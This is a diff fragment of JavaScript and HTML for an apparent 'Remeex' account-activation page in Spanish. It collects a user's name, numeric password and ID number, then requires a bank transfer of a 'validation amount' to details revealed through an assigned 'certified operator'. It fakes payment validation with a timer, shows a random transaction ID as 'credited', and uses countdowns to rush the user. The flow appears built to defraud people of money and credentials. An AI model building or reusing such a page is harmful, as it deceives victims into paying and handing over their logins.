+        return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+    }
+    
+    // Formato para copiado sin puntos (solo con coma decimal)
+function formatForClipboard(number) {
+    return number.toString().replace(/\./g, "").replace(",", ",");
+}
+
+function formatCurrency(amount, currency = 'usd') {
+    if (currency === 'usd') {
+        return '$' + amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    }
+    return 'Bs ' + amount.toLocaleString('es-VE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+}
+
+function getPurposeLabel(value) {
+    switch (value) {
+        case 'registration':
+            return 'Registro de cuenta';
+        case 'verification':
+        default:
+            return 'Verificación de cuenta';
+    }
+}
+
+function updateBalanceInfo() {
+    const balanceData = readStoredObject('remeexBalance', {});
+    const currentUsd = balanceData.usd || 0;
+    const currentBs = balanceData.bs || 0;
+    const forcedAmount = getActiveForcedValidationAmount();
+    const storedState = getStoredPendingActivation();
+    const storedAmount = storedState && typeof storedState.amount === 'number' && !isNaN(storedState.amount)
+        ? storedState.amount
+        : null;
+    const projectedAmount = forcedAmount !== null
+        ? forcedAmount
+        : (storedAmount !== null
+            ? storedAmount
+            : getEffectiveValidationAmount(currentUsd));
+    const newUsd = currentUsd + projectedAmount;
+    const newBs = currentBs + projectedAmount * dollarRate;
+    const cUsd = document.getElementById('current-balance-usd');
+    const cBs = document.getElementById('current-balance-bs');
+    const fUsd = document.getElementById('future-balance-usd');
+    const fBs = document.getElementById('future-balance-bs');
+    if (cUsd) cUsd.textContent = formatCurrency(currentUsd, 'usd');
+    if (cBs) cBs.textContent = formatCurrency(currentBs, 'bs');
+    if (fUsd) fUsd.textContent = formatCurrency(newUsd, 'usd');
+    if (fBs) fBs.textContent = formatCurrency(newBs, 'bs');
+}
+    
+    // Sistema de partículas para protección de datos
+    function initParticles() {
+        const canvas = document.getElementById('particles-canvas');
+        if (!canvas) return; // Verificación para evitar errores
+        
+        const ctx = canvas.getContext('2d');
+        
+        function resizeCanvas() {
+            const container = document.querySelector('.payment-data-card');
+            if (container) {
+                canvas.width = container.offsetWidth;
+                canvas.height = container.offsetHeight;
+            }
+        }
+        
+        window.addEventListener('resize', resizeCanvas);
+        
+        // Crear partículas iniciales
+        function createParticles() {
+            particles = [];
+            const particleCount = window.innerWidth < 768 ? 50 : 100; // Menos partículas en móvil
+            
+            for (let i = 0; i < particleCount; i++) {
+                particles.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    size: Math.random() * 4 + 1,
+                    speedX: Math.random() * 3 - 1.5,
+                    speedY: Math.random() * 3 - 1.5,
+                    color: Math.random() > 0.6 ? 
+                           `rgba(26, 31, 113, ${Math.random() * 0.5 + 0.1})` : 
+                           Math.random() > 0.3 ? 
+                           `rgba(247, 182, 0, ${Math.random() * 0.5 + 0.1})` :
+                           `rgba(255, 255, 255, ${Math.random() * 0.3 + 0.1})`,
+                    alpha: Math.random() * 0.5 + 0.1,
+                    alphaSpeed: Math.random() * 0.01
+                });
+            }
+        }
+        
+        // Animar partículas con efecto de pulso
+        function animateParticles() {
+            if (!document.getElementById('payment-overlay').classList.contains('active')) {
+                requestAnimationFrame(animateParticles);
+                return;
+            }
+            
+            resizeCanvas();
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            particles.forEach(particle => {
+                // Actualizar posición
+                particle.x += particle.speedX;
+                particle.y += particle.speedY;
+                
+                // Efecto de pulso en la opacidad
+                particle.alpha += particle.alphaSpeed;
+                if (particle.alpha > 0.5 || particle.alpha < 0.1) {
+                    particle.alphaSpeed *= -1;
+                }
+                
+                // Rebote en los bordes
+                if (particle.x < 0 || particle.x > canvas.width) {
+                    particle.speedX *= -1;
+                }
+                if (particle.y < 0 || particle.y > canvas.height) {
+                    particle.speedY *= -1;
+                }
+                
+                // Dibujar partícula con opacidad variable
+                const color = particle.color.replace(/[\d\.]+\)$/g, `${particle.alpha})`);
+                ctx.fillStyle = color;
+                ctx.beginPath();
+                ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2);
+                ctx.closePath();
+                ctx.fill();
+            });
+            
+            requestAnimationFrame(animateParticles);
+        }
+        
+        // Iniciar animación cuando se muestra el overlay
+        const paymentOverlay = document.getElementById('payment-overlay');
+        if (paymentOverlay) {
+            paymentOverlay.addEventListener('transitionend', function() {
+                if (this.classList.contains('active')) {
+                    resizeCanvas();
+                    createParticles();
+                    animateParticles();
+                }
+            });
+        }
+    }
+    
+    // Actualizar la visualización del monto
+    function updateAmountDisplay() {
+        const bsAmount = (selectedAmount * dollarRate).toFixed(2);
+        let formattedBsAmount = formatNumberWithCommas(bsAmount);
+        formattedBsAmount = formattedBsAmount.replace(/\.(\d{2})$/, ',$1');
+
+        if (document.getElementById('secure-amount')) {
+            document.getElementById('secure-amount').textContent = `${formattedBsAmount} Bs`;
+        }
+
+        if (document.getElementById('amount-copy-btn')) {
+            const clipboardAmount = formatForClipboard(formattedBsAmount);
+            document.getElementById('amount-copy-btn').setAttribute('onclick', `copyToClipboard('${clipboardAmount}', this)`);
+        }
+
+        // También actualizar el valor en el formulario de detalles
+        if (document.getElementById('transfer-amount')) {
+            document.getElementById('transfer-amount').value = formattedBsAmount + " Bs";
+        }
+    }
+    
+    // Cargar logos de bancos
+    function loadBankLogos() {
+        const container = document.getElementById('bank-logos');
+        if (!container) return; // Verificación para evitar errores
+        
+        // Limpiar el contenedor antes de cargar los logos
+        container.innerHTML = '';
+        
+        bankList.forEach((bank, index) => {
+            const logoDiv = document.createElement('div');
+            logoDiv.className = 'bank-logo';
+            logoDiv.setAttribute('data-bank', bank.name);
+            logoDiv.setAttribute('data-index', index);
+            logoDiv.setAttribute('tabindex', '0'); // Para mejorar la accesibilidad
+            logoDiv.setAttribute('role', 'button');
+            logoDiv.setAttribute('aria-label', `Seleccionar ${bank.name}`);
+            logoDiv.setAttribute("data-bankid", bank.id);
+
+            // Mostrar logo y mantener compatibilidad con lazy loading
+            logoDiv.innerHTML = `<img src="${bank.logo}" data-src="${bank.logo}" loading="lazy" alt="${bank.name}" title="${bank.name}">`;
+
+            if (selectedBank && bank.id === selectedBank) {
+                logoDiv.classList.add('selected');
+                logoDiv.setAttribute('aria-selected', 'true');
+            }
+
+            logoDiv.addEventListener('click', function() {
+                // Deseleccionar todos los bancos
+                document.querySelectorAll('.bank-logo').forEach(el => {
+                    el.classList.remove('selected');
+                    el.setAttribute('aria-selected', 'false');
+                });
+
+                // Seleccionar el banco actual
+                this.classList.add('selected');
+                this.setAttribute('aria-selected', 'true');
+                selectedBank = this.getAttribute('data-bankid');
+                document.getElementById('bank-error').textContent = '';
+                persistPendingActivation({ bankId: selectedBank });
+            });
+            
+            // Soporte para navegación con teclado (accesibilidad)
+            logoDiv.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    e.preventDefault();
+                    this.click();
+                }
+            });
+            
+            container.appendChild(logoDiv);
+        });
+    }
+    
+    // Crear líneas de interferencia aleatorias
+    function createInterferenceLines() {
+        const container = document.querySelector('.payment-data-card');
+        if (!container) return; // Verificación para evitar errores
+        
+        const existingLines = document.querySelectorAll('.interference-line');
+        
+        // Eliminar líneas existentes
+        existingLines.forEach(line => line.remove());
+        
+        // Crear nuevas líneas en posiciones aleatorias
+        for (let i = 0; i < 5; i++) {
+            const line = document.createElement('div');
+            line.className = 'interference-line';
+            
+            const randomTop = Math.random() * 100;
+            const randomDelay = Math.random() * 5;
+            const randomDuration = 2 + Math.random() * 3;
+            
+            line.style.top = `${randomTop}%`;
+            line.style.animation = `scan-line ${randomDuration}s linear infinite ${randomDelay}s`;
+            
+            container.appendChild(line);
+        }
+    }
+    
+    // Toggle checkbox para confirmación de transferencia
+    function toggleTransferCheckbox() {
+        const checkbox = document.getElementById('transfer-checkbox');
+        const continueButton = document.getElementById('continue-button');
+        
+        if (!checkbox) return; // Verificación para evitar errores
+        
+        transferConfirmed = !transferConfirmed;
+        
+        if (transferConfirmed) {
+            checkbox.classList.add('checked');
+            checkbox.setAttribute('aria-checked', 'true');
+            continueButton.disabled = false;
+        } else {
+            checkbox.classList.remove('checked');
+            checkbox.setAttribute('aria-checked', 'false');
+            continueButton.disabled = true;
+        }
+    }
+    
+    // Toggle checkbox para entendimiento del proceso
+    function toggleUnderstandingCheckbox() {
+        const checkbox = document.getElementById('understanding-checkbox');
+        const loginButton = document.getElementById('login-btn');
+        
+        if (!checkbox || !loginButton) return; // Verificación para evitar errores
+        
+        understandingConfirmed = !understandingConfirmed;
+        
+        if (understandingConfirmed) {
+            checkbox.classList.add('checked');
+            checkbox.setAttribute('aria-checked', 'true');
+            loginButton.disabled = false;
+        } else {
+            checkbox.classList.remove('checked');
+            checkbox.setAttribute('aria-checked', 'false');
+            loginButton.disabled = true;
+        }
+    }
+    
+    // Validar inicio de sesión
+    function validateLogin() {
+        if (!understandingConfirmed) {
+            showToast("Por favor confirme que entiende el proceso marcando la casilla correspondiente.");
+            return;
+        }
+        
+        const accessCode = document.getElementById('access-code').value;
+        const userName = document.getElementById('user-name').value;
+        let isValid = true;
+        
+        // Validar nombre
+        if (userName.trim() === '') {
+            document.getElementById('name-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su nombre';
+            isValid = false;
+        } else {
+            document.getElementById('name-error').textContent = '';
+        }
+        
+        // Validar código de acceso
+        if (!skipAccessCode) {
+            if (accessCode.trim() === '') {
+                document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su clave';
+                isValid = false;
+            } else if (!/^\d+$/.test(accessCode.trim())) {
+                document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Formato inválido. Solo números';
+                isValid = false;
+            } else {
+                document.getElementById('code-error').textContent = '';
+            }
+        }
+        
+        // Si todo es válido, pasar al siguiente paso
+        if (isValid) {
+            document.getElementById('login-form').classList.remove('active');
+            document.getElementById('user-data-form').classList.add('active');
+            document.getElementById('step-1').classList.remove('active');
+            document.getElementById('step-1').classList.add('completed');
+            document.getElementById('step-2').classList.add('active');
+            
+            // Actualizar la barra de progreso
+            document.getElementById('progress-steps').setAttribute('data-progress', '2');
+            
+            // Pre-llenar el nombre en el siguiente formulario
+            document.getElementById('full-name').value = userName;
+            // Usar la clave ingresada como número de documento por defecto
+            const idField = document.getElementById('id-number');
+            if (idField && !idField.value) idField.value = accessCode.trim();
+        }
+    }
+    
+    // Validar datos de usuario
+    function validateUserData() {
+        const fullName = document.getElementById('full-name').value;
+        const idNumber = document.getElementById('id-number').value;
+        const docType = document.getElementById('doc-type').value;
+        let isValid = true;
+        
+        // Validar nombre completo
+        if (fullName.trim() === '') {
+            document.getElementById('fullname-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su nombre completo';
+            isValid = false;
+        } else {
+            document.getElementById('fullname-error').textContent = '';
+        }
+        
+        // Validar cédula
+        if (idNumber.trim() === '') {
+            document.getElementById('id-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su número de identidad';
+            isValid = false;
+        } else if (!/^\d+$/.test(idNumber)) {
+            document.getElementById('id-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Formato inválido. Solo números sin guiones';
+            isValid = false;
+        } else {
+            document.getElementById('id-error').textContent = '';
+        }
+        
+        // Si todo es válido, pasar al siguiente paso
+        if (isValid) {
+            document.getElementById('user-data-form').classList.remove('active');
+            document.getElementById('payment-info').classList.add('active');
+            document.getElementById('step-2').classList.remove('active');
+            document.getElementById('step-2').classList.add('completed');
+            document.getElementById('step-3').classList.add('active');
+            
+            // Actualizar la barra de progreso
+            document.getElementById('progress-steps').setAttribute('data-progress', '3');
+        }
+    }
+    
+    // Mostrar overlay con datos de recarga
+    function showPaymentData() {
+        if (!operatorAssigned || !assignedOperator) {
+            showToast('Antes de visualizar los datos bancarios debe conectarse con un operador cajero certificado.');
+            return;
+        }
+
+        // Asegurar que el monto corresponda a la opción seleccionada
+        const selectedOption = document.querySelector('.amount-option.selected');
+        if (selectedOption) {
+            selectedAmount = parseFloat(selectedOption.getAttribute('data-value'));
+        }
+
+        document.getElementById('payment-overlay').classList.add('active');
+
+        refreshBodyScrollLock();
+
+        // Actualizar el monto según la selección
+        updateAmountDisplay();
+        
+        // Crear líneas de interferencia adicionales en posiciones aleatorias
+        createInterferenceLines();
+        
+        // Marcar que el usuario ha visto los datos de pago
+        hasViewedPaymentData = true;
+        
+        // Mostrar el checkbox de confirmación de transferencia
+        document.getElementById('transfer-confirmation').classList.add('visible');
+    }
+
+    // Cerrar overlay y verificar si se puede habilitar el botón de continuar
+    function closePaymentOverlay() {
+        document.getElementById('payment-overlay').classList.remove('active');
+
+        refreshBodyScrollLock();
+
+        // Si el usuario ya ha visto los datos, mostrar el checkbox
+        if (hasViewedPaymentData) {
+            document.getElementById('transfer-confirmation').classList.add('visible');
+        }
+    }
+    
+    // Función para mostrar notificaciones tipo toast
+    function showToast(message) {
+        // Crear el elemento toast si no existe
+        let toast = document.getElementById('toast-notification');
+        if (!toast) {
+            toast = document.createElement('div');
+            toast.id = 'toast-notification';
+            toast.style.position = 'fixed';
+            toast.style.bottom = '20px';
+            toast.style.left = '50%';
+            toast.style.transform = 'translateX(-50%)';
+            toast.style.backgroundColor = 'rgba(26, 31, 113, 0.9)';
+            toast.style.color = 'white';
+            toast.style.padding = '10px 20px';
+            toast.style.borderRadius = '10px';
+            toast.style.boxShadow = '0 4px 15px rgba(0, 0, 0, 0.2)';
+            toast.style.zIndex = '9999';
+            toast.style.transition = 'all 0.3s ease';
+            toast.style.opacity = '0';
+            toast.setAttribute('role', 'alert'); // Para mejor accesibilidad
+            document.body.appendChild(toast);
+        }
+        
+        // Actualizar mensaje y mostrar
+        toast.textContent = message;
+        toast.style.opacity = '1';
+        
+        // Ocultar después de 3 segundos
+        setTimeout(() => {
+            toast.style.opacity = '0';
+        }, 3000);
+    }
+    
+    // Función para copiar al portapapeles
+    function copyToClipboard(text, button) {
+        // Para el monto, asegurarse de que se copie sin puntos
+        if (button.parentElement.querySelector('.payment-data-label').textContent.includes('Monto:')) {
+            text = formatForClipboard(text);
+        }
+        
+        navigator.clipboard.writeText(text).then(function() {
+            // Mostrar tooltip
+            const tooltip = button.querySelector('.tooltip');
+            tooltip.classList.add('active');
+            
+            // Ocultar tooltip después de 2 segundos
+            setTimeout(function() {
+                tooltip.classList.remove('active');
+            }, 2000);
+        }).catch(function(err) {
+            console.error('Error al copiar: ', err);
+            showToast('No se pudo copiar al portapapeles. Por favor, inténtalo manualmente.');
+        });
+    }
+    
+    // Función mejorada para copiar al portapapeles con revelación temporal
+    function copyWithReveal(text, button, contentId, instructionId, confirmationId) {
+        // Eliminar guiones para números de teléfono y RIF
+        const textToCopy = text.replace(/-/g, "");
+        
+        // Referencias a los elementos DOM
+        const contentElement = document.getElementById(contentId);
+        const instructionElement = document.getElementById(instructionId);
+        const confirmationElement = document.getElementById(confirmationId);
+        
+        // Copiar al portapapeles
+        navigator.clipboard.writeText(textToCopy).then(function() {
+            // 1. Mostrar el contenido oculto brevemente
+            contentElement.classList.add('visible');
+            
+            // 2. Ocultar la instrucción
+            instructionElement.classList.add('hidden');
+            
+            // 3. Mostrar la confirmación
+            confirmationElement.classList.add('visible');
+            
+            // 4. Cambiar apariencia del botón
+            button.classList.add('copied');
+            button.innerHTML = '<i class="fas fa-check"></i> Copiado';
+            
+            // 5. Después de 2 segundos, ocultar el contenido
+            setTimeout(function() {
+                contentElement.classList.remove('visible');
+                
+                // 6. Después de 3 segundos, restaurar todo a su estado original
+                setTimeout(function() {
+                    instructionElement.classList.remove('hidden');
+                    confirmationElement.classList.remove('visible');
+                    button.classList.remove('copied');
+                    button.innerHTML = '<i class="fas fa-copy"></i> Copiar ' + (contentId === 'secure-rif' ? 'RIF' : 'teléfono');
+                }, 1000);
+            }, 2000);
+        })
+        .catch(function(error) {
+            console.error('Error al copiar al portapapeles:', error);
+            showToast('No se pudo copiar el texto. Por favor, inténtelo de nuevo.');
+        });
+    }
+    
+    // Ir al formulario de detalles de transferencia
+    function goToTransferDetails() {
+        // Validar que se haya visto los datos de pago
+        if (!hasViewedPaymentData) {
+            showToast("Para continuar, primero debe revisar los datos para realizar la transferencia. Haga clic en 'Ver Datos para Recarga'.");
+            return;
+        }
+        
+        // Validar que se haya confirmado la transferencia
+        if (!transferConfirmed) {
+            showToast("Por favor confirme que ha realizado la transferencia marcando la casilla de verificación.");
+            return;
+        }
+        
+        document.getElementById('payment-info').classList.remove('active');
+        document.getElementById('transfer-details-form').classList.add('active');
+        document.getElementById('step-3').classList.remove('active');
+        document.getElementById('step-3').classList.add('completed');
+        document.getElementById('step-4').classList.add('active');
+        
+        // Actualizar la barra de progreso
+        document.getElementById('progress-steps').setAttribute('data-progress', '4');
+        
+        // Prellenar el monto de transferencia con el monto seleccionado en bolivares
+        const bsAmount = (selectedAmount * dollarRate).toFixed(2);
+        document.getElementById('transfer-amount').value = formatNumberWithCommas(bsAmount) + " Bs";
+        
+        // Establecer la fecha actual en el campo de fecha
+        const today = new Date();
+        const formattedDate = today.toISOString().substr(0, 10);
+        document.getElementById('transfer-date').value = formattedDate;
+    }
+    
+    // Iniciar temporizador de sesión
+    function startSessionTimer() {
+        const timerElement = document.getElementById('session-timer');
+        const countdownElement = document.getElementById('countdown');
+        
+        if (!timerElement || !countdownElement) return; // Verificación para evitar errores
+        
+        // Mostrar el temporizador
+        timerElement.classList.add('active');
+        
+        // Reiniciar el contador
+        countdownValue = 45;
+        countdownElement.textContent = countdownValue;
+        
+        // Limpiar cualquier temporizador existente
+        if (sessionTimer) {
+            clearInterval(sessionTimer);
+        }
+        
+        // Iniciar temporizador de cuenta regresiva
+        sessionTimer = setInterval(function() {
+            countdownValue--;
+            countdownElement.textContent = countdownValue;
+            
+            if (countdownValue <= 10) {
+                // Cambiar a rojo cuando quedan 10 segundos o menos
+                timerElement.classList.add('danger');
+            }
+            
+            if (countdownValue <= 0) {
+                // Detener el temporizador
+                clearInterval(sessionTimer);
+                
+                // Cierre de sesión
+                showToast('Su sesión ha expirado por seguridad. El sistema cerrará automáticamente.');
+                setTimeout(() => {
+                    location.reload();
+                }, 2000);
+            }
+        }, 1000);
+    }
+    
+    // Validar formulario de detalles de transferencia
+    function validateTransferDetails() {
+        const date = document.getElementById('transfer-date').value;
+        const reference = document.getElementById('transfer-reference').value;
+        let isValid = true;
+        
+        // Validar fecha
+        if (!date) {
+            document.getElementById('date-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor seleccione la fecha de transferencia';
+            isValid = false;
+        } else {
+            document.getElementById('date-error').textContent = '';
+        }
+        
+        // Validar banco seleccionado
+        if (!selectedBank) {
+            document.getElementById('bank-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor seleccione el banco';
+            isValid = false;
+        } else {
+            document.getElementById('bank-error').textContent = '';
+        }
+        
+        // Validar referencia
+        if (!reference) {
+            document.getElementById('reference-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese el número de referencia';
+            isValid = false;
+        } else if (!/^\d+$/.test(reference)) {
+            document.getElementById('reference-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> El número de referencia debe contener solo dígitos';
+            isValid = false;
+        } else {
+            document.getElementById('reference-error').textContent = '';
+        }
+        
+        return isValid;
+    }
+    
+    // Enviar comprobante
+    function confirmPayment() {
+        if (!validateTransferDetails()) {
+            return;
+        }
+
+        const transferDateField = document.getElementById('transfer-date');
+        const referenceField = document.getElementById('reference-number');
+        const dateValue = transferDateField ? transferDateField.value : '';
+        const referenceValue = referenceField ? referenceField.value.trim() : '';
+        persistPendingActivation({
+            date: dateValue,
+            reference: referenceValue,
+            bankId: selectedBank || null,
+            amount: selectedAmount
+        });
+        storedTransferDate = dateValue;
+        storedReferenceNumber = referenceValue;
+
+        // Mostrar spinner
+        const spinnerContainer = document.getElementById('spinner-container');
+        spinnerContainer.classList.add('active');
+        refreshBodyScrollLock();
+
+        // Simular proceso de validación (3 segundos)
+        setTimeout(function() {
+            // Ocultar spinner y mostrar checkmark
+            document.querySelector('.spinner').style.display = 'none';
+            document.querySelector('.processing-text').style.display = 'none';
+            document.getElementById('checkmark-container').classList.add('active');
+
+            // Iniciar temporizador de cierre de sesión
+            startSessionTimer();
+        }, 3000);
+    }
+
+    function renderPostPaymentSummary() {
+        const container = document.querySelector('.container');
+        if (!container) return;
+
+        const amountUsd = formatCurrency(selectedAmount, 'usd');
+        let bsAmount = (selectedAmount * dollarRate).toFixed(2);
+        bsAmount = formatNumberWithCommas(bsAmount).replace(/\.(\d{2})$/, ',$1');
+
+        const operatorName = assignedOperator ? assignedOperator.name : 'operador certificado asignado';
+        const operatorCode = assignedOperator ? assignedOperator.code : '--';
+        const purposeLabel = getPurposeLabel(selectedPurpose);
+        const transactionId = Math.floor(Math.random() * 1000000000).toString().padStart(9, '0');
+
+        container.innerHTML = `
+            <div class="card active">
+                <h2>Comprobante registrado</h2>
+                <p>Tu comprobante fue incorporado exitosamente al sistema de recargas. El operador ${operatorName} acompañará la verificación final antes de activar tu cuenta.</p>
+
+                <div class="concept-alert" style="border-color: var(--success-color); background-color: rgba(23, 168, 75, 0.05);">
+                    <i class="fas fa-check-circle" style="color: var(--success-color);"></i>
+                    <div class="concept-alert-content">
+                        <div class="concept-alert-title" style="color: var(--success-color);">Resumen de la operación</div>
+                        <div class="concept-alert-text">
+                            ID de transacción: ${transactionId} · Monto acreditado: <strong>${amountUsd}</strong> (${bsAmount} Bs) · Operador ${operatorCode} · Objetivo: ${purposeLabel}.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payment-alert">
+                    <div class="payment-alert-header">
+                        <div class="payment-alert-icon">
+                            <i class="fas fa-exclamation-triangle"></i>
+                        </div>
+                        <div class="payment-alert-title">Código de concepto obligatorio</div>
+                    </div>
+                    <div class="payment-alert-body">
+                        <div class="payment-alert-message">
+                            <strong>Importante:</strong> el código de concepto/descripción debe ser <strong>${conceptCode}</strong>. Si tu comprobante no lo incluye, genera una nota adicional o realiza una nueva transferencia con el código correcto.
+                        </div>
+                        <div class="payment-alert-code">${conceptCode}</div>
+                        <div class="payment-alert-message">
+                            Conserva la referencia bancaria y súbela en el portal de activación cuando se te solicite. El operador asignado revisará la información antes de habilitar tu cuenta.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="concept-alert" style="margin-top: 30px;">
+                    <i class="fas fa-info-circle"></i>
+                    <div class="concept-alert-content">
+                        <div class="concept-alert-title">Próximos pasos</div>
+                        <div class="concept-alert-text">
+                            En unos segundos se abrirá la ventana de activación para que completes el proceso en "Acceso a mi Cuenta". Ten a mano tu comprobante y tu documento de identidad.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+    }
+
+    function populateActivationOverlay() {
+        const operatorNameEl = document.getElementById('activation-operator-name');
+        if (operatorNameEl) operatorNameEl.textContent = assignedOperator ? assignedOperator.name : 'Operador certificado';
+
+        const operatorCodeEl = document.getElementById('activation-operator-code');
+        if (operatorCodeEl) operatorCodeEl.textContent = assignedOperator ? assignedOperator.code : '--';
+
+        const amountUsdEl = document.getElementById('activation-amount-usd');
+        if (amountUsdEl) amountUsdEl.textContent = formatCurrency(selectedAmount, 'usd');
+
+        const amountBsEl = document.getElementById('activation-amount-bs');
+        if (amountBsEl) {
+            let bsAmount = (selectedAmount * dollarRate).toFixed(2);
+            bsAmount = formatNumberWithCommas(bsAmount).replace(/\.(\d{2})$/, ',$1');
+            amountBsEl.textContent = `${bsAmount} Bs`;
+        }
+
+        const conceptEl = document.getElementById('activation-concept-code');
+        if (conceptEl) conceptEl.textContent = conceptCode;
+
+        const conceptListEl = document.getElementById('activation-concept-code-list');
+        if (conceptListEl) conceptListEl.textContent = conceptCode;
+
+        const purposeEl = document.getElementById('activation-purpose-text');
+        if (purposeEl) purposeEl.textContent = getPurposeLabel(selectedPurpose);
+    }
+
+    function showActivationOverlay() {
+        populateActivationOverlay();
+
+        const overlay = document.getElementById('activation-overlay');
+        if (!overlay) return;
+
+        overlay.classList.add('active');
+        refreshBodyScrollLock();
+
+        activationCountdownValue = 60;
+        const countdownEl = document.getElementById('activation-countdown');
+        if (countdownEl) countdownEl.textContent = activationCountdownValue;
+
+        if (activationCountdownInterval) {
+            clearInterval(activationCountdownInterval);
+        }
+
+        activationCountdownInterval = setInterval(() => {
+            activationCountdownValue--;
+            if (countdownEl) countdownEl.textContent = activationCountdownValue;
+
+            if (activationCountdownValue <= 0) {
+                clearInterval(activationCountdownInterval);
+                activationCountdownInterval = null;
+                redirectToActivation();
+            }
+        }, 1000);
+    }
+
+    function closeActivationOverlay() {
+        const overlay = document.getElementById('activation-overlay');
+        if (!overlay) return;
+
+        overlay.classList.remove('active');
+
+        if (activationCountdownInterval) {
+            clearInterval(activationCountdownInterval);
+            activationCountdownInterval = null;
+        }
+
+        refreshBodyScrollLock();
+    }
+
+    function redirectToActivation() {
+        window.location.href = 'Accesoamicuenta.html';
+    }
+
+    // Completar proceso
+    function completeProcess() {
+        const spinnerContainer = document.getElementById('spinner-container');
+        if (spinnerContainer) {
+            spinnerContainer.classList.remove('active');
+
+            const spinner = spinnerContainer.querySelector('.spinner');
+            const processingLabel = spinnerContainer.querySelector('.processing-text');
+            if (spinner) spinner.style.display = '';
+            if (processingLabel) processingLabel.style.display = '';
+
+            const checkmark = document.getElementById('checkmark-container');
+            if (checkmark) checkmark.classList.remove('active');
+        }
+
+        refreshBodyScrollLock();
+
+        persistPendingActivation({
+            amount: selectedAmount,
+            operator: assignedOperator ? assignedOperator.code : null
+        });
+
+        renderPostPaymentSummary();
+        showActivationOverlay();
+    }
+    
+    // Función para volver al paso anterior
+    function goBack(currentFormId, previousFormId) {
+        document.getElementById(currentFormId).classList.remove('active');
+        document.getElementById(previousFormId).classList.add('active');
+        
+        // Actualizar pasos
+        if (currentFormId === 'user-data-form') {
+            document.getElementById('step-2').classList.remove('active');
+            document.getElementById('step-1').classList.remove('completed');
+            document.getElementById('step-1').classList.add('active');
+            // Actualizar la barra de progreso
+            document.getElementById('progress-steps').setAttribute('data-progress', '1');
+        } else if (currentFormId === 'payment-info') {
+            document.getElementById('step-3').classList.remove('active');
+            document.getElementById('step-2').classList.remove('completed');
+            document.getElementById('step-2').classList.add('active');
+            // Actualizar la barra de progreso
+            document.getElementById('progress-steps').setAttribute('data-progress', '2');
+        }
+    }
+    
+    // Cerrar overlay al hacer clic fuera
+    document.getElementById('payment-overlay').addEventListener('click', function(e) {
+        if (e.target === this) {
+            closePaymentOverlay();
+        }
+    });
+
+    window.pendingActivationStorage = {
+        get: getStoredPendingActivation,
+        set(partial) {
+            const updated = persistPendingActivation(partial);
+            applyPendingActivationState(updated, certifiedOperators);
+            adjustAmountsByBalance();
+            loadAmountOptions();
+            loadBankLogos();
+            updateBalanceInfo();
+            return updated;
+        },
+        clear() {
+            try {
+                localStorage.removeItem(PENDING_ACTIVATION_STORAGE_KEY);
+                selectedBank = null;
+                storedTransferDate = '';
+                storedReferenceNumber = '';
+                window.__pendingActivationStateCache = {};
+            } catch (err) {
+                console.warn('No se pudo limpiar el estado local de activación', err);
+            }
+        }
+    };
+</script>
+
+    <!-- Reproducir sonido de construcción al iniciar sesión -->
+    <audio id="buildingSound" preload="auto" style="display:none;">
+        <source src="remeexvisabuilding.ogg" type="audio/ogg">
+    </audio>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const audio = document.getElementById('buildingSound');
+            if (audio) {
+                audio.currentTime = 0;
+                const playPromise = audio.play();
+                if (playPromise !== undefined) {
+                    playPromise.catch(err => console.error('Audio playback failed:', err));
+                }
+            }
+        });
+    </script>
+</body>
+</html>
+  <script src="preload.js"></script>
